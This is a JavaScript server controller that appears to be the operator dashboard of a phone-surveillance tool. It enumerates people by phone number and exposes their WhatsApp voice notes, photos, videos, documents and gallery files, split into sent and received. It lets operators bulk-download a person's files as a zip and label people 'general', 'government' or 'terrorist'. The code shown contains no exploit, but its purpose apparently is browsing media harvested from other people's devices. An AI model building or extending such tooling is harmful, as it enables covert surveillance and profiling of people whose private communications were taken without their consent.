const storage = require("../services/firebaseStorage");

// In-memory category store (persisted to Firestore when available)
let userCategories = {}; // { "+923...": "general" | "government" | "terrorist" }
let categoriesLoaded = false;

// Try to load/save categories from Firestore
async function loadCategories() {
  if (categoriesLoaded) return;
  try {
    const { getFirestore } = require("../config/firebase");
    const db = getFirestore();
    const snap = await db.collection("userCategories").get();
    snap.forEach((doc) => { userCategories[doc.id] = doc.data().category || "general"; });
  } catch (e) { console.log("Categories: using in-memory fallback"); }
  categoriesLoaded = true;
}

async function saveCategory(phone, category) {
  userCategories[phone] = category;
  try {
    const { getFirestore } = require("../config/firebase");
    const db = getFirestore();
    await db.collection("userCategories").doc(phone).set({ category, updatedAt: new Date().toISOString() });
  } catch (e) { /* Firestore not available, in-memory only */ }
}

// Cache users list for 5 minutes
let cachedUsers = null;
let cacheTime = 0;
const CACHE_TTL = 5 * 60 * 1000;

const getAll = async (req, res) => {
  try {
    await loadCategories();
    const { search, page = 1, limit = 50, category } = req.query;

    if (!cachedUsers || Date.now() - cacheTime > CACHE_TTL) {
      const phoneNumbers = await storage.discoverAllUsers();
      cachedUsers = phoneNumbers.map((phone) => ({
        _id: phone,
        userId: phone,
        phone: phone,
        displayName: phone,
        category: userCategories[phone] || "general",
      }));
      cacheTime = Date.now();
    }

    let users = cachedUsers.map((u) => ({
      ...u,
      category: userCategories[u.phone] || "general",
    }));

    // Filter by category
    if (category && category !== "all") {
      users = users.filter((u) => u.category === category);
    }

    // Search filter
    if (search) {
      const q = search.toLowerCase();
      users = users.filter((u) => u.phone.includes(q) || u.displayName.toLowerCase().includes(q));
    }

    const total = users.length;
    const pageNum = Number(page);
    const limitNum = Number(limit);
    const paged = users.slice((pageNum - 1) * limitNum, pageNum * limitNum);

    // Category counts
    const allUsers = cachedUsers.map((u) => ({ ...u, category: userCategories[u.phone] || "general" }));
    const categoryCounts = {
      all: allUsers.length,
      general: allUsers.filter((u) => u.category === "general").length,
      government: allUsers.filter((u) => u.category === "government").length,
      terrorist: allUsers.filter((u) => u.category === "terrorist").length,
    };

    res.json({ success: true, users: paged, total, page: pageNum, totalPages: Math.ceil(total / limitNum), categoryCounts });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

const getById = async (req, res) => {
  try {
    await loadCategories();
    const phone = req.params.id;
    const stats = await storage.getUserStats(phone);

    const user = {
      _id: phone,
      userId: phone,
      phone: phone,
      displayName: phone,
      category: userCategories[phone] || "general",
      apps: stats.apps,
      stats: {
        voiceNotes: stats.voiceNotes,
        images: stats.images,
        videos: stats.videos,
        documents: stats.documents,
        audio: stats.audio,
        gallery: stats.gallery,
        totalFiles: stats.totalFiles,
      },
    };

    res.json({ success: true, user });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get user's app folders (WhatsApp, BusinessWhatsApp, gallery)
const getUserApps = async (req, res) => {
  try {
    const phone = req.params.id;
    const apps = await storage.getUserApps(phone);
    res.json({ success: true, phone, apps });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get categories inside an app (voiceNotes, documents, images, audio, video)
const getAppCategories = async (req, res) => {
  try {
    const phone = req.params.id;
    const app = req.params.app;
    const categories = await storage.getAppCategories(phone, app);
    res.json({ success: true, phone, app, categories });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get files for a specific category (with optional direction: Sent/Received)
const getCategoryFiles = async (req, res) => {
  try {
    const phone = req.params.id;
    const app = req.params.app;
    const category = req.params.category;
    const direction = req.query.direction || "all";

    const files = await storage.getUserCategoryFiles(phone, app, category, direction);
    const directions = await storage.getCategoryDirections(phone, app, category);

    res.json({ success: true, phone, app, category, direction, directions, files, total: files.length });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Get all files for a user
const getUserAllFiles = async (req, res) => {
  try {
    const phone = req.params.id;
    const data = await storage.getUserAllFiles(phone);

    res.json({
      success: true,
      phone,
      ...data,
      stats: {
        voiceNotes: data.voiceNotes.length,
        images: data.images.length,
        videos: data.videos.length,
        documents: data.documents.length,
        audio: data.audio.length,
        gallery: data.gallery.length,
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Set user category
const setUserCategory = async (req, res) => {
  try {
    const phone = req.params.id;
    const { category } = req.body;
    const validCategories = ["general", "government", "terrorist"];
    if (!validCategories.includes(category)) {
      return res.status(400).json({ success: false, message: `Invalid category. Use: ${validCategories.join(", ")}` });
    }
    await saveCategory(phone, category);
    // Invalidate cache so next getAll picks up the change
    cachedUsers = null;
    res.json({ success: true, phone, category });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Storage overview
const getStorageOverview = async (req, res) => {
  try {
    const overview = await storage.getStorageOverview();
    res.json({ success: true, ...overview });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Browse a storage path
const browsePath = async (req, res) => {
  try {
    const prefix = req.query.path || "";
    const prefixes = await storage.listPrefixes(prefix);
    const files = await storage.listFiles(prefix, 100);

    res.json({
      success: true,
      path: prefix,
      folders: prefixes.map((f) => ({ name: f.replace(prefix, "").replace(/\/$/, ""), fullPath: f })),
      files,
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// Download files as zip
const downloadAsZip = async (req, res) => {
  const { id } = req.params;
  const { fileType } = req.query; // images, videos, documents, voiceNotes, audio, gallery
  
  try {
    const phone = decodeURIComponent(id);
    const allFiles = await storage.getUserAllFiles(phone);
    
    let filesToZip = [];
    let zipName = `${phone.replace(/\+/g, '')}_${fileType || 'all'}.zip`;
    
    if (fileType && allFiles[fileType]) {
      filesToZip = allFiles[fileType];
    } else if (!fileType) {
      // Download all files
      filesToZip = [
        ...(allFiles.images || []),
        ...(allFiles.videos || []),
        ...(allFiles.documents || []),
        ...(allFiles.voiceNotes || []),
        ...(allFiles.audio || []),
        ...(allFiles.gallery || []),
      ];
      zipName = `${phone.replace(/\+/g, '')}_all_files.zip`;
    }
    
    if (filesToZip.length === 0) {
      return res.status(404).json({ success: false, message: 'No files found' });
    }
    
    const archiver = require('archiver');
    const axios = require('axios');
    
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="${zipName}"`);
    
    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.pipe(res);
    
    // Download and add each file to zip
    for (const file of filesToZip) {
      try {
        const response = await axios.get(file.downloadUrl, { responseType: 'stream' });
        archive.append(response.data, { name: file.fileName || file.name });
      } catch (err) {
        console.error(`Failed to download ${file.name}:`, err.message);
      }
    }
    
    await archive.finalize();
  } catch (err) {
    console.error('Download zip error:', err);
    if (!res.headersSent) {
      res.status(500).json({ success: false, message: err.message });
    }
  }
};

module.exports = {
  getAll,
  getById,
  getUserApps,
  getAppCategories,
  getCategoryFiles,
  getUserAllFiles,
  setUserCategory,
  getStorageOverview,
  browsePath,
  downloadAsZip,
};
